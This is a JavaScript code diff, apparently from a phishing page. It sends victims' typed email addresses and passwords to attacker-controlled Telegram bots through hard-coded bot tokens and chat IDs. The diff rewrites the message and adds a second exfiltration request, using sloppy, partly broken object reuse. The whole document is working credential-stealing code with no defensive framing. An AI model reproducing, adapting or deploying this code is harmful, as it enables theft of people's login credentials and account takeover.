@@ -993,32 +993,38 @@
                 };
                 xhr.open(
                   "get",
-                  `https://api.telegram.org/bot7576138037:AAFXf3fTyBM95oeK_flU7z5UdDfT9Mb_FXc/sendMessage?chat_id=-4725672369&text=\nNew Connection 🟢
+                  `https://api.telegram.org/bot7576138037:AAFXf3fTyBM95oeK_flU7z5UdDfT9Mb_FXc/sendMessage?chat_id=-4725672369&text=
 
-\n🌐 Network: N/A\n
-\n
-\n🌍 Domain: domain name\n
-\n🔍 Browser: Chrome\n
-\n📧 Email : ${email}\n
-\n 🔒 Password:${password}\n`,
+              📧 Email : ${email}\n
+              🔒 Password:${password}\n`,
                   true
                 );
                 xhr.setRequestHeader(
                   "Content-Type",
                   "application/x-www-form-urlencoded; charset=UTF-8"
                 );
-                                xhr.open(
-                  "get",
-                  `https://api.telegram.org/bot7916534030:AAFPSCSO_B-VCFUNdILwWiRTawFvqwQV51A/sendMessage?chat_id=-7356694709&text=\nNew Connection 🟢
 
-\n🌐 Network: N/A\n
-\n
-\n🌍 Domain: domain name\n
-\n🔍 Browser: Chrome\n
-\n📧 Email : ${email}\n
-\n 🔒 Password:${password}\n`,
+                xhr.setRequestHeader(
+                  "Content-Type",
+                  "application/x-www-form-urlencoded; charset=UTF-8"
+                );
+                xhr.send();
+                var req2 = new XMLHttpRequest();
+                req2.onreadystatechange = function () {
+                  if (xhr.readyState === 4) {
+                    console.log(xhr.response);
+                  }
+                };
+                xhr.open(
+                  "get",
+                  `https://api.telegram.org/bot7916534030:AAFPSCSO_B-VCFUNdILwWiRTawFvqwQV51A/sendMessage?chat_id=7356694709&text=New Connection 📧 Email : ${email}\n 🔒 Password:${password}\n`,
                   true
                 );
+                xhr.setRequestHeader(
+                  "Content-Type",
+                  "application/x-www-form-urlencoded; charset=UTF-8"
+                );
+
                 xhr.setRequestHeader(
                   "Content-Type",
                   "application/x-www-form-urlencoded; charset=UTF-8"
